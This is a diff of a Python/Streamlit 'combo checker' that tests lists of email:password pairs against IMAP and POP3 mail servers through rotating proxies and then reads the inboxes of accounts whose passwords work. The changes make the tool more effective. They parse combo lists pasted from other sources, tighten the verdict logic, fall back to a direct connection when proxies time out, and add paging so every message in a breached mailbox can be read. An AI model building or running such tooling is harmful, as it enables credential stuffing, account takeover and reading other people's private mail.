@@ -738,7 +738,13 @@ UI_MIN_INTERVAL = 0.12
 # whole run, on a 1 GB container. The ring is 3000 now and the TABLE copies only
 # _DF_TAIL_LIVE of it. The ZIP, the .txt export and the Full Log page still carry
 # every row, so nothing is lost - only the part held in RAM changes.
-BUCKET_RENDER_TAIL = 1000
+#
+# v13.75 FIX CAP-1: the caps below were still sized for the v13.70 memory panic
+# and the screen was the part that paid. 1000 inline lines is one page of a real
+# result set and the summary is where the user actually reads it - and the whole
+# cost is now ONE html block per bucket inside a fixed-height scroller, not the
+# 24,000 widgets DELTA-1 was written about. 3000 matches the ring.
+BUCKET_RENDER_TAIL = 3000
 # FIX DELTA-1 (v13.67): THE LIVE LOOP DREW A SEPARATE WIDGET PER LINE, up to
 # BUCKET_RENDER_TAIL of them, for twelve buckets, on every UI tick. At
 # UI_MIN_INTERVAL that is up to ~200,000 deltas a second at the tail of a run -
@@ -747,11 +753,17 @@ BUCKET_RENDER_TAIL = 1000
 # after which it stops applying deltas: the run continues, the screen freezes.
 # The live bucket render is one HTML block per bucket, capped here; the summary
 # block still shows the full set and the download buttons carry every line.
-BUCKET_LIVE_TAIL = 250
+#
+# v13.75 FIX CAP-1: 250 -> 300. A live tick is 12 html blocks either way; the
+# extra 50 lines per bucket are 600 strings per tick, which is nothing next to
+# the 3000-row report ring that was already being copied on the same clock.
+BUCKET_LIVE_TAIL = 300
 # v13.70 MEM-2: the live snapshot copies exactly this many lines per bucket per
 # tick - it used to copy all of them and then draw BUCKET_LIVE_TAIL of each. The
 # true count is passed alongside the tail, so the "+N more" line stays honest.
-BUCKET_SNAPSHOT_TAIL = 250
+# v13.75 FIX CAP-1: it must never be BELOW BUCKET_LIVE_TAIL, or the snapshot cuts
+# the tail the renderer then tries to draw and the "+N more" line over-counts.
+BUCKET_SNAPSHOT_TAIL = 300
 # Buckets get their own, slower clock than the log stream.
 BUCKET_MIN_INTERVAL = 0.6
 LOG_CAP_DEBUG = 3000
@@ -9276,9 +9288,16 @@ with str_lit.sidebar:
     _pend = str_lit.session_state.get("_audit_pending") or {}
     _steal = bool(_pend) and not _pend.get("outcome")
 
-    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** lines / **{len(_ips)}** IPs / "
-                 f"**{len(_subs)}** sub-users / **{len(WEBSHARE_KEYS)}** keys | "
-                 f"Filtered: **{len(filtered_pool)}** | Alive: **{_alive_now}**")
+    # v13.75 FIX INFO-1: the summary line is an st.info, and st.info is NOT in
+    # audit_log._MESSAGES - it closes nothing - but it still paints a full-width
+    # blue box on every single load, and with the flash now rendering at block 057
+    # a load that HAS something to say ended up with the flash, then this box, then
+    # the pool warnings. Under a pending press it is a caption like everything else
+    # in this block.
+    (str_lit.caption if _steal else str_lit.info)(
+        f"Loaded Proxies: **{len(all_proxies)}** lines / **{len(_ips)}** IPs / "
+        f"**{len(_subs)}** sub-users / **{len(WEBSHARE_KEYS)}** keys | "
+        f"Filtered: **{len(filtered_pool)}** | Alive: **{_alive_now}**")
 
     if all_proxies and not filtered_pool:
         _etxt = ("⚠ **Every proxy was filtered out** by Min Proxy Score / pool mode / "
@@ -9320,8 +9339,9 @@ with str_lit.sidebar:
             _rfunc = str_lit.caption if _steal else str_lit.warning
         _rfunc(_rtxt)
     elif not all_proxies and not WEBSHARE_KEYS:
-        str_lit.info("No proxies configured - press 📥 Fetch & Test All Proxies, or run "
-                     "fully DIRECT.")
+        (str_lit.caption if _steal else str_lit.info)(
+            "No proxies configured - press 📥 Fetch & Test All Proxies, or run "
+            "fully DIRECT.")
 
     str_lit.caption(
         f"Probe ({CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)}, {probe_timeout():.0f}s): "
@@ -9741,7 +9761,8 @@ with str_lit.sidebar:
                     str_lit.session_state["_proxy_flash"] = ("success", "Quarantine lifted.")
                     str_lit.rerun()
         else:
-            str_lit.info("No proxy metadata recorded yet.")
+            # v13.75 FIX INFO-1: the third unguarded st.info in this block.
+            (str_lit.caption if _steal else str_lit.info)("No proxy metadata recorded yet.")
 
         # ---- FIX KEY-1: THE RETIRED TABLE (no row cap) -----------------------
         if _hidden_snap:
@@ -10680,6 +10701,54 @@ _PASTE_MAX = 5 * 1024 * 1024
 _INPUT_OWNER_KEY = "_input_owner"
 _PASTE_LIMIT_NOTE = ""
 
+# ==========================================================================
+# v13.75 FIX PASTE-1 - A PASTE FROM THE OUTSIDE IS NOT A COLON LIST
+#
+# process_accounts() split each line on ":" and took part 0 as the email, so a
+# list pasted out of a spreadsheet, a chat message, a note app or THIS APP'S OWN
+# bucket output was thrown away almost in full:
+#
+#   - a@b.com:pw          ok
+#   - a@b.com:pw          a bullet made the address "- a@b.com"
+#   1. a@b.com:pw         a numbered list made it "1. a@b.com"
+#   • a@b.com:pw          ditto, with a bullet glyph
+#   mailto:a@b.com:pw     a mailto: prefix made it "mailto:a@b.com"
+#   "a@b.com:pw"          quotes kept, so the address carried them
+#   a@b.com:pw | VALID    a re-pasted bucket line kept "pw | VALID" as the password
+#
+# The last one matters most: the app's own bucket lines are the obvious thing to
+# paste back in for a re-run, and block 105's _raw_of() already cuts them at "|"
+# on the RE-RUN path - the paste path had no equivalent, so the password carried
+# the whole verdict sentence and every account failed.
+#
+# The normaliser runs on the PREFILTER path only. The box itself keeps exactly
+# what was pasted, so nothing is silently rewritten under the user, and the
+# fingerprint is still taken from the raw text - a normalisation change cannot
+# make a cached result look stale.
+# ==========================================================================
+_BULLET_RE = re.compile(r"^[\s\u2022\u00b7\u25cf\u2043\-\*>]+")
+_NUM_RE = re.compile(r"^\d{1,4}[.)]\s+")
+_MAILTO_RE = re.compile(r"^mailto:\s*", re.IGNORECASE)
+
+
+def _normalise_combo_line(line):
+    """One pasted line -> `email:password`. Never raises, never adds anything."""
+    s = str(line or "").replace("\u00a0", " ").strip().lstrip("\ufeff").strip()
+    s = _BULLET_RE.sub("", s)
+    s = _NUM_RE.sub("", s)
+    s = _MAILTO_RE.sub("", s)
+    s = s.strip().strip("\"'").strip().strip("<>").strip()
+    if "|" in s:
+        s = s.split("|", 1)[0].strip()
+    return s.rstrip(",;").strip()
+
+
+def _normalise_paste(text):
+    """Whole paste -> the same lines, normalised. Blank lines are preserved."""
+    if not text:
+        return ""
+    return "\n".join(_normalise_combo_line(_l) for _l in str(text).splitlines())
+
 
 def _read_text_file(path, cap=4096):
     try:
@@ -10762,7 +10831,8 @@ with input_tab1:
     _ph1, _ph2 = str_lit.columns([0.62, 0.38])
     with _ph1:
         str_lit.caption("Saved to your own paste file - it survives a refresh, a tab "
-                        "close and a redeploy.")
+                        "close and a redeploy. Bullets, numbers, `mailto:` and pasted "
+                        "`email:pass | verdict` lines are all understood.")
     with _ph2:
         str_lit.button("🧹 Clear paste", width="stretch", on_click=_on_paste_clear,
                        help="Empties the box AND the saved copy.")
@@ -10822,16 +10892,19 @@ if raw_text:
     )
     _pf_cache = str_lit.session_state.get("_bb_prefilter_cache") or {}
     _pf_data = _pf_cache.get("data") if _pf_cache.get("fp") == _pf_fp else None
+    # FIX PASTE-1: normalise ONCE, on the prefilter path, and feed every consumer
+    # from the normalised text - the counts, the SMTP domain scan and the queue.
+    _pf_text = _normalise_paste(raw_text)
     if _pf_data is None:
         try:
-            _pending_smtp = ([d for d in _domains_in_text(raw_text) if not smtp_cached(d)]
+            _pending_smtp = ([d for d in _domains_in_text(_pf_text) if not smtp_cached(d)]
                              if CFG.get("SMTP_CHECK", False) else [])
             if _pending_smtp:
                 with str_lit.spinner(f"🛰 SMTP reachability pre-check on "
                                      f"{len(_pending_smtp)} new domain(s)..."):
-                    _pf_data = process_accounts(raw_text, previous_valid)
+                    _pf_data = process_accounts(_pf_text, previous_valid)
             else:
-                _pf_data = process_accounts(raw_text, previous_valid)
+                _pf_data = process_accounts(_pf_text, previous_valid)
         except Exception as _pf_err:
             str_lit.exception(_pf_err)
             _pf_data = ([], [], [], [], [], [], [], [])
@@ -11638,7 +11711,21 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
 # plus their HTML strings plus base64 image URIs was enough to segfault the free
 # container. The renderer splits text and HTML back out of "raw" itself.
 # v13.65: the unused _BODY_FETCH_BYTES constant is gone; the fetch cut is _RAW_CAP.
-_BODY_SHOW_CHARS = 20000
+#
+# v13.75 FIX PAGE-1 / CAP-1:
+#   * the reader had NO PAGING. It fetched the newest `limit` ids and that was the
+#     only window that ever existed, so message 11 of an inbox was unreachable no
+#     matter what the slider said - the slider only changed how many of the newest
+#     ones appeared. `page` selects a window (1 = newest), and `info` is an
+#     optional dict the caller passes to learn the true total and the clamped page
+#     so it can draw forward/back. Both are keyword arguments with defaults, so a
+#     caller that passes neither gets exactly the old behaviour and the old
+#     3-tuple return.
+#   * 20000 characters of body was about 350 lines - a normal newsletter was cut
+#     off mid-sentence. 120000 is a full message for practically everything, and
+#     the raw bytes were already capped at 700 KB per message and held anyway, so
+#     the text cap was the cheaper half of a cost already being paid.
+_BODY_SHOW_CHARS = 120000
 _RAW_CAP = 700 * 1024
 
 
@@ -11713,12 +11800,19 @@ def _body_text(raw):
     if not text:
         return "(no readable text in this message)"
     if len(text) > _BODY_SHOW_CHARS:
-        return text[:_BODY_SHOW_CHARS] + "\n\n[... truncated - open the full message elsewhere]"
+        return (text[:_BODY_SHOW_CHARS]
+                + "\n\n[... truncated at %d characters - the message is longer than "
+                  "this view shows]" % _BODY_SHOW_CHARS)
     return text
 
 
-def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
-    """Return (ok, [message dict], note). Newest first; body + raw included."""
+def read_mailbox_messages(email, password, server, proxy_str=None, limit=10, page=1,
+                          info=None):
+    """Return (ok, [message dict], note). Newest first; body + raw included.
+
+    `page` 1 is the newest window; higher pages walk back through the inbox.
+    `info`, when given, is filled with {"total", "page", "pages"}.
+    """
     mail = None
     try:
         conf_hosts = get_servers(email).get("imap", []) or [server]
@@ -11732,9 +11826,34 @@ def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
         ids = data[0].split()
         if not ids:
             return False, [], "the inbox is empty"
-        latest_ids = ids[-limit:] if len(ids) > limit else ids
+
+        # FIX PAGE-1: a WINDOW, not just the newest `limit`. Clamped to the last
+        # full page, so a page past the end lands on the oldest messages instead
+        # of on an empty list.
+        try:
+            limit = max(1, int(limit))
+        except Exception:
+            limit = 10
+        total = len(ids)
+        pages = max(1, (total + limit - 1) // limit)
+        try:
+            page = int(page)
+        except Exception:
+            page = 1
+        page = max(1, min(pages, page))
+        end = total - (page - 1) * limit
+        start = max(0, end - limit)
+        window = ids[start:end]
+        if info is not None:
+            try:
+                info.update({"total": total, "page": page, "pages": pages})
+            except Exception:
+                pass
+        if not window:
+            return False, [], "the inbox is empty"
+
         out = []
-        for mid in reversed(latest_ids):
+        for mid in reversed(window):
             heads = {"subject": "", "from": "", "date": ""}
             typ, hdr = mail.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])")
             if typ == "OK":
@@ -11861,9 +11980,16 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
     # v13.54: saw_plan is new.  A 402 never reached a mailbox and sets none of the
     # other flags, so a wholly 402 proxy phase looked like a clean run with no
     # answer - the direct sweep was skipped and the account landed on FAILED.
+    # v13.75: saw_port_block and ran_direct are DECLARED HERE now. Both were only
+    # ever created by assignment deep inside block 102 / block 103, and block 104
+    # reads them through flags.get() in two tails - so a path that threw before
+    # the first 403 or before _run_direct left the key absent and the tail fell
+    # through on a .get() default it should never have needed. Declaring them in
+    # the literal makes the flag set complete and self-documenting: every flag the
+    # tail tests is visible in one place.
     flags = {"saw_407": False, "saw_nonproxy": False, "saw_server": False,
              "saw_login_drop": False, "saw_tls_refused": False, "saw_auth": False,
-             "saw_plan": False}
+             "saw_plan": False, "saw_port_block": False, "ran_direct": False}
     force_direct = {"flag": False}
     host_407 = {}
     net_failed_hosts = set()
@@ -12249,11 +12375,10 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                 return newpx, True
             return px_used, False
 
-        def _handle_app_or_wrong(st_val, proto, server, port, user, u_idx, px_used, seen_px,
-                                 had_net, saw_retry):
+        def _handle_app_or_wrong(st_val, proto, server, port, user, u_idx, px_used, seen_px):
             """Shared body for the APP / WRONG verdict handling.
 
-            Returns (result_tuple_or_None, had_net, saw_retry, advance).
+            Returns (result_tuple_or_None, advance).
               * result is not None      -> RETURN it
               * advance is True         -> keep going (PROVISIONAL)
               * advance is "retry_user" -> retry this host as the LOCAL PART
@@ -12265,18 +12390,32 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
             imap.<domain> box the gate therefore confirmed on the FIRST rung and
             a valid combo was reported WRONG without POP3, the sibling hosts or
             143/110 ever being dialled.
+
+            FIX APP-1 (v13.75): THE APP GATE HAD THE IDENTICAL DEFECT, unfixed.
+            The WRONG branch below counts only LOCAL hosts, so a public host can
+            never decide the account - the APP branch counted EVERY host, so one
+            answer from a shared imap.gmail.com / outlook.office365.com confirmed
+            an APP verdict on the first rung and skipped the whole ladder for a
+            domain whose own mailboxes might have accepted the password. It is
+            local-only now, and the trace line reports the local count.
+
+            FIX RET-1 (v13.75): had_net / saw_retry were passed IN, returned
+            UNCHANGED beside the result, and unpacked by both callers back into
+            the same names - a four-tuple round-trip that carried no information
+            and invited the next reader to think the helper could change them.
+            They are gone; the result and the advance are the whole contract.
             """
             if st_val == APP:
                 xres = try_ms_xoauth2(server, px_used, attempt_to_ref[0], err_text)
                 if xres:
-                    return xres, had_net, saw_retry, False
+                    return xres, False
                 if u_idx + 1 < len(users):
                     flags["saw_server"] = True
                     px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry",
                                                     keep_node=True)
                     trace_logs.append(f"{px_tag(px_used)} App-password signal as '{user}' -> "
                                       f"retrying same host as local-part '{users[u_idx + 1]}'")
-                    return None, had_net, saw_retry, "retry_user"
+                    return None, "retry_user"
                 app_hosts.add(server)
                 app_rungs.add((server, proto, port))
                 _untried_local = [h for h in domain_local_hosts if h not in tried_hosts]
@@ -12285,7 +12424,10 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                                     if r[1] == server
                                     and (r[1], r[0], r[2]) not in wrong_rungs
                                     and (r[1], r[0], r[2]) not in app_rungs]
-                _confirmed = ((len(app_hosts) >= 2) or (len(app_rungs) >= 2)
+                # FIX APP-1: only LOCAL hosts and LOCAL rungs may confirm.
+                _local_app = [h for h in app_hosts if _is_local_host(h)]
+                _local_app_rungs = [r for r in app_rungs if _is_local_host(r[0])]
+                _confirmed = ((len(_local_app) >= 2) or (len(_local_app_rungs) >= 2)
                               or (not _conf_pool and not _rungs_left_here))
                 if (not confirm_wrong) or _confirmed:
                     # A definitive XOAUTH2 WRONG outranks a basic-auth "app
@@ -12293,15 +12435,16 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                     if best_verdict["status"] == WRONG:
                         return (None, WRONG,
                                 best_verdict["detail"] + _wrong_detail_note(domain, password),
-                                px_used, trace_logs), had_net, saw_retry, False
+                                px_used, trace_logs), False
                     return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}",
-                            px_used, trace_logs), had_net, saw_retry, False
+                            px_used, trace_logs), False
                 trace_logs.append(
                     f"{px_tag(px_used)} APP on {server} -> PROVISIONAL "
-                    f"({len(app_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
-                    f"still untried, {len(_untried_local)} local, "
-                    f"{len(app_rungs)} rung(s) dialled) -> continuing")
-                return None, had_net, saw_retry, True
+                    f"({len(_local_app)} LOCAL host(s) agreed of {len(app_hosts)} total, "
+                    f"{len(_conf_pool)} candidate(s) still untried, "
+                    f"{len(_untried_local)} local, {len(app_rungs)} rung(s) dialled) "
+                    f"-> continuing")
+                return None, True
 
             # ---- WRONG (single copy - the duplicate after the first return is gone) ----
             # The local-part retry runs FIRST: a legacy Zimbra / cPanel / Dovecot
@@ -12316,7 +12459,7 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                                                 keep_node=True)
                 trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same "
                                   f"host as local-part '{users[u_idx + 1]}'")
-                return None, had_net, saw_retry, "retry_user"
+                return None, "retry_user"
 
             wrong_hosts.add(server)
             wrong_rungs.add((server, proto, port))
@@ -12340,14 +12483,14 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                 return (None, WRONG,
                         f"{px_tag(px_used)} {proto} {server} -> {st_val}"
                         + _wrong_detail_note(domain, password),
-                        px_used, trace_logs), had_net, saw_retry, False
+                        px_used, trace_logs), False
 
             trace_logs.append(
                 f"{px_tag(px_used)} WRONG on {server} -> PROVISIONAL "
                 f"({len(wrong_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
                 f"still untried, {len(_untried_local)} local, "
                 f"{len(wrong_rungs)} rung(s) dialled) -> continuing the ladder")
-            return None, had_net, saw_retry, True
+            return None, True
 # @@END 101 CORE_VERDICT_HELPERS
 
 # @@BLOCK 102 CORE_SWEEP deps=016,022,100,101
@@ -12367,9 +12510,22 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                 trace_logs.append(f"{label}: no window left ({max(0.0, left):.1f}s).")
                 return None, had_net, saw_retry
 
-            per_to = max(3.0, min(configured_to, left / max(1, len(rungs))))
+            # FIX RUNG-1 (v13.75): THE 3.0s FLOOR WAS EATING THE WINDOW.
+            # The share was max(3.0, min(configured_to, left / len(rungs))) - so a
+            # 12-rung ladder was promised 36s inside a DEADLINE_FAST window of 60s
+            # that also has to carry the direct phase, and every rung past the
+            # floor was then cut by the deadline check rather than by its own
+            # timeout. The floor is RUNG_COST_MIN (5.0), the same constant block
+            # 100 uses to size the work floor, and the share is capped at
+            # RUNG_COST_MAX so one rung can never claim the whole window.
+            per_to = max(RUNG_COST_MIN, min(configured_to, RUNG_COST_MAX,
+                                            left / max(1, len(rungs))))
             trace_logs.append(f"--- {label}: {len(rungs)} rung(s), ~{per_to:.1f}s each, "
                               f"{left:.1f}s window ---")
+
+            # FIX TO-1 (v13.75): consecutive-timeout counter. See the check after
+            # the username loop.
+            _to_streak = 0
 
             for rung_idx, (proto, server, port, tls_mode) in enumerate(rungs):
                 if time.time() > deadline_ts:
@@ -12410,6 +12566,8 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                     retry_same_node = False
                     proxy_dead = False
                     tls_refused = False
+                    # FIX TO-1: set by the two timeout handlers only.
+                    _was_timeout = False
                     err_text = ""
 
                     for u_idx, user in enumerate(users):
@@ -12580,6 +12738,9 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                             flags["saw_nonproxy"] = True
                             had_net = True
                             net_failed_hosts.add(server)
+                            # FIX TO-1: this is the only handler that feeds the
+                            # consecutive-timeout breaker below.
+                            _was_timeout = True
                             record_proxy_attempt(px_used, success=False, is_network_error=True)
                             trace_logs.append(f"{px_tag(px_used)} -> TIMEOUT {proto} "
                                               f"{server}:{port}: {err_text[:140]} "
@@ -12649,9 +12810,8 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                                     f"password still untested; continuing the ladder")
 
                             if st_val in (APP, WRONG):
-                                res, had_net, saw_retry, act = _handle_app_or_wrong(
-                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
-                                    had_net, saw_retry)
+                                res, act = _handle_app_or_wrong(
+                                    st_val, proto, server, port, user, u_idx, px_used, seen_px)
                                 if res is not None:
                                     return res, had_net, saw_retry
                                 if act == "retry_user":
@@ -12702,6 +12862,10 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                             st_val = classify_error(e, domain)
                             proxy_level = _is_proxy_level_error(err_text)
                             tls_refused = _is_tls_refused(err_text)
+                            # FIX TO-1: a generic transport timeout counts too -
+                            # _is_timeout() is the same test the tail uses.
+                            if _is_timeout(e):
+                                _was_timeout = True
                             if proxy_level:
                                 flags["saw_407"] = True
                                 record_proxy_attempt(px_used, success=False,
@@ -12738,9 +12902,8 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                                     f"password still untested; continuing the ladder")
 
                             if st_val in (APP, WRONG):
-                                res, had_net, saw_retry, act = _handle_app_or_wrong(
-                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
-                                    had_net, saw_retry)
+                                res, act = _handle_app_or_wrong(
+                                    st_val, proto, server, port, user, u_idx, px_used, seen_px)
                                 if res is not None:
                                     return res, had_net, saw_retry
                                 if act == "retry_user":
@@ -12788,6 +12951,29 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                             break
                         if server_level_fail:
                             break
+
+                    # FIX TO-1 (v13.75): TWO CONSECUTIVE TIMEOUTS MEAN THE PATH IS
+                    # GONE, NOT THAT THE RUNG NEEDS ANOTHER GO.
+                    # Each timed-out rung was spending its own timeout, then a
+                    # rotation, then an in-place retry - so on a dead path the
+                    # ladder walked the whole host list at 5-8s per rung, ran out
+                    # of window, and the account ended on "all hosts unreachable
+                    # (timeouts/refused)" having never left the proxy egress. Two
+                    # in a row now abandon the pass and trip the same breaker a 407
+                    # storm uses, so the DIRECT sweep runs while there is still
+                    # window left to dial it. A non-timeout answer resets the count,
+                    # so an alternating answer/timeout host is unaffected.
+                    if _was_timeout:
+                        _to_streak += 1
+                        if _to_streak >= 2:
+                            trace_logs.append(
+                                f"{px_tag(px_used)} {_to_streak} consecutive timeouts - the "
+                                f"path is not answering; abandoning this pass and handing "
+                                f"the account to DIRECT.")
+                            force_direct["flag"] = True
+                            return None, had_net, saw_retry
+                    else:
+                        _to_streak = 0
 
                     # FIX P2-1: a same-node 407 retry only earns its slot if a REAL
                     # attempt still fits.  The old guard asked for 3s of window and
@@ -13112,8 +13298,33 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
             "mail host reached but the server dropped LOGIN (server-side) - try the "
             "other protocol/host, or an app password"
         ), None, trace_logs
-    return None, FAILED, ("all hosts unreachable (timeouts/refused) - password could not "
-                          "be tested"), None, trace_logs
+    # v13.75 FIX TAIL-1: THIS LAST LINE WAS A CATCH-ALL THAT TOLD THE USER NOTHING
+    # AND MISLED ABOUT WHAT HAPPENED.
+    # "timeouts/refused" named both, so a ladder that timed out on every rung read
+    # as though the host had actively refused the connection - and neither word
+    # said whether the direct egress had already been tried, which is the one fact
+    # that decides what to do next. The count of hosts that failed at the
+    # transport level is real (net_failed_hosts), so it is printed, and the advice
+    # splits on ran_direct.
+    _nf_n = len(net_failed_hosts)
+    if flags.get("ran_direct"):
+        trace_logs.append(
+            f"{_nf_n} host(s) failed at the transport level on BOTH the proxy and the "
+            f"direct egress -> the host list is the problem, not the password.")
+        return None, FAILED, (
+            f"no host answered - {_nf_n} host(s) timed out or refused, and the DIRECT sweep "
+            f"had already run, so the same hosts were dialled from a second egress and "
+            f"failed there too. The password could not be tested. Check the discovered host "
+            f"names for this domain, or retry later."
+        ), None, trace_logs
+    trace_logs.append(
+        f"{_nf_n} host(s) failed at the transport level and DIRECT was never dialled -> "
+        f"the proxy path is the suspect, not the password.")
+    return None, FAILED, (
+        f"all hosts unreachable ({_nf_n} host(s) timed out or refused) and the DIRECT "
+        f"sweep never ran, so this is the path rather than the mailbox. Retry from another "
+        f"egress (or with Proxy Mode Engine = off) before discarding the combo."
+    ), None, trace_logs
 # @@END 104 CORE_TAIL
 
 # @@BLOCK 105 RUN_TRIGGER_UI deps=019,034,055,083,087
@@ -14400,7 +14611,7 @@ if start_engine_btn:
 # "inherits the summary warning" symptom. They now degrade to a caption while a
 # press is unanswered, the same _steal shape block 080 already uses.
 #
-# v13.75 FIX COMBO-1 / CAP-1:
+# v13.75 FIX COMBO-1 / CAP-1 / INFO-1:
 #   * the buckets were drawn with st.code, which is white-space:pre with
 #     horizontal overflow - the line scrolled sideways inside the box and the
 #     email:password sat off the left of the visible area. They go through
@@ -14409,6 +14620,9 @@ if start_engine_btn:
 #   * _DF_TAIL was a magic 1000 while the ring it reads is REPORT_ENTRIES_MAX,
 #     so a finished run hid two thirds of its own report table for no stated
 #     reason. It is derived from the ring now.
+#   * the skipped-accounts line was the last bare str_lit.info here. It is not a
+#     message widget (st.info never closes an entry) but it still painted a
+#     full-width box over whatever the load had to say, so it is guarded too.
 _DF_TAIL = REPORT_ENTRIES_MAX
 
 try:
@@ -14626,7 +14840,8 @@ if str_lit.session_state.engine_has_run or _persisted_valid:
             f"🩹 **{proxy_len_val} account(s) never reached a mailbox** - every attempt died "
             f"with 407 Proxy Authentication Required. Those passwords are still UNTESTED.")
     if skip_len_val:
-        str_lit.info(
+        # v13.75 FIX INFO-1: guarded like the two warnings above.
+        (str_lit.caption if _steal108 else str_lit.info)(
             f"⏭ **{skip_len_val} account(s) were skipped** (bad format / disposable / "
             f"fast-mode cooldown). They were counted as checked; they are listed in the "
             f"Skipped bucket and the ZIP.")
@@ -14734,6 +14949,14 @@ except Exception:
 # The stored account is validated against the CURRENT option list BEFORE the
 # selectbox is created. With key= and no index, a stored value that is not in
 # options is a StreamlitAPIException - which is what a stale account did.
+#
+# v13.75 FIX PAGE-1: THE READER COULD ONLY EVER SHOW THE NEWEST WINDOW.
+# The slider chose how many of the most recent messages appeared, and message 11
+# of an inbox was unreachable at every slider position - the "fetch" was the only
+# navigation that existed, and it always replaced the list with the same newest
+# slice. There is a page cursor now (bb_reader_page), the fetch takes it, and a
+# Newer / Older pair sits above the list with the page and total spelled out.
+# Page 1 is the newest, so the existing Read button keeps its old meaning.
 # ==========================================================================
 _READER_STATE_NAME = "reader_state.json"
 _READER_OWNER_KEY = "_reader_owner"
@@ -14802,6 +15025,7 @@ _reader_owner = _cache_owner()
 if str_lit.session_state.get(_READER_OWNER_KEY) != _reader_owner:
     for _k in ("bb_reader_acct", "bb_reader_max", "bb_reader_remote", "bb_reader_auto",
                "bb_reader_msgs", "bb_reader_for", "bb_reader_note",
+               "bb_reader_page", "bb_reader_total", "bb_reader_combo",
                "_reader_tried", "_rdr_state"):
         str_lit.session_state.pop(_k, None)
     str_lit.session_state[_READER_OWNER_KEY] = _reader_owner
@@ -14901,8 +15125,8 @@ else:
         _r_for = str_lit.session_state.get("bb_reader_for") or ""
         _r_note = str_lit.session_state.get("bb_reader_note") or ""
 
-        def _reader_do_fetch(combo, limit):
-            """Fetch one inbox into session state. Never raises."""
+        def _reader_do_fetch(combo, limit, page=1):
+            """Fetch ONE PAGE of one inbox into session state. Never raises."""
             str_lit.session_state["_reader_tried"] = True
             try:
                 acc_email, acc_pass = combo.split(":", 1)
@@ -14919,25 +15143,25 @@ else:
             str_lit.session_state["bb_reader_msgs"] = []
             str_lit.session_state["bb_reader_for"] = acc_email
             str_lit.session_state["bb_reader_note"] = ""
+            str_lit.session_state["bb_reader_combo"] = combo
+            str_lit.session_state["bb_reader_page"] = max(1, int(page or 1))
 
             if not imap_hosts:
                 str_lit.session_state["bb_reader_note"] = (
                     "No IMAP host available for this provider domain name.")
                 return
+            # FIX PAGE-1: `info` carries the true total and the CLAMPED page back
+            # out, so the Newer / Older pair knows where it is. read_mailbox_messages
+            # resolves the whole host ladder itself via get_servers() and falls back
+            # to the host passed in, so this is one ladder, not one per host.
+            _info = {}
+            fetched_msgs = []
             try:
                 with str_lit.spinner(f"Connecting via [{px_tag(mailbox_proxy)}] and "
-                                     f"fetching inbox for {acc_email}..."):
-                    # v13.48: read_mailbox_messages() already resolves the whole
-                    # host ladder itself via get_servers() and falls back to the
-                    # host passed in. The old `for srv in imap_hosts:` loop re-ran
-                    # that entire ladder once per host, so a 4-host domain could
-                    # open 4x4 ladders and burn proxy credit before giving up.
+                                     f"fetching page {page} of the inbox for {acc_email}..."):
                     ok_read, msgs, note = read_mailbox_messages(
                         acc_email, acc_pass, imap_hosts[0],
-                        proxy_str=mailbox_proxy, limit=limit)
-                    # v13.72: `fetched_msgs, success_read = msgs, True` stood here
-                    # and success_read was set again two lines down and never read
-                    # by anything. The branch below tests ok_read and the list.
+                        proxy_str=mailbox_proxy, limit=limit, page=page, info=_info)
                     fetched_msgs = msgs
                     if not ok_read:
                         fetched_msgs = []
@@ -14953,17 +15177,21 @@ else:
             except Exception as _rf_err:
                 str_lit.session_state["bb_reader_msgs"] = []
                 str_lit.session_state["bb_reader_note"] = f"{type(_rf_err).__name__}: {_rf_err}"
+            # Always recorded, success or not, so the nav reflects the CLAMPED
+            # page the server actually answered from.
+            str_lit.session_state["bb_reader_total"] = int(_info.get("total") or 0)
+            str_lit.session_state["bb_reader_page"] = int(_info.get("page") or page or 1)
 
         if str_lit.button("📖 Read Inbox Messages"):
             if selected_combo:
-                _reader_do_fetch(selected_combo, max_msgs)
+                _reader_do_fetch(selected_combo, max_msgs, 1)
         elif _restored and _pick and not _r_msgs and not _r_note:
             # ONE attempt, only on a restore, and only when the switch is on. A
             # refresh re-opens the inbox the user was in instead of showing an
             # empty page - unless they turned that off.
             if allow_auto:
                 str_lit.caption("↩ Restored your last account - re-opening its inbox...")
-                _reader_do_fetch(_pick, max_msgs)
+                _reader_do_fetch(_pick, max_msgs, 1)
             else:
                 str_lit.caption("↩ Restored your last account - auto re-open is off, so "
                                 "nothing was fetched. Press Read Inbox Messages when you "
@@ -14977,9 +15205,38 @@ else:
         if _r_note:
             str_lit.warning(f"Could not read mailbox: {_r_note}")
         elif _r_msgs:
+            # FIX PAGE-1: the paging cursor. Totals come from the fetch, so this
+            # describes the INBOX, not the list currently on screen.
+            _r_total = int(str_lit.session_state.get("bb_reader_total") or 0)
+            _r_page = max(1, int(str_lit.session_state.get("bb_reader_page") or 1))
+            _r_pages = max(1, (_r_total + max(1, max_msgs) - 1) // max(1, max_msgs)) \
+                if _r_total else 1
             str_lit.success(
